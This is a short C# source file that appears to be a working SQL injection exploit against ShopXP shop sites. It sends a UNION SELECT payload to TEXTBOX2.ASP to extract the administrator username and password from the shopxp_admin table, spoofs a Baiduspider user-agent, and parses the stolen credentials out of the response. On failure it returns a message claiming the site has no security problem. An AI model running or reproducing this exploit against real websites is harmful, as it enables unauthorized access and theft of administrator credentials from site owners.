using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class shopxp
	{
		public string shuju(string url)
		{
			string result;
			try
			{
				string exps = "/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin";
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + url;
				}
				string bb = new WebClient
				{
					Headers = 
					{

						{
							"user-agent",
							"Baiduspider"
						}
					},
					Encoding = Encoding.UTF8
				}.DownloadString(urls + exps).Replace("\n", "").Replace("\r", "");
				int c = bb.IndexOf("<body");
				int d = bb.IndexOf("</body>");
				string shuju = bb.Substring(c + 68, d - c - 68);
				result = shuju;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
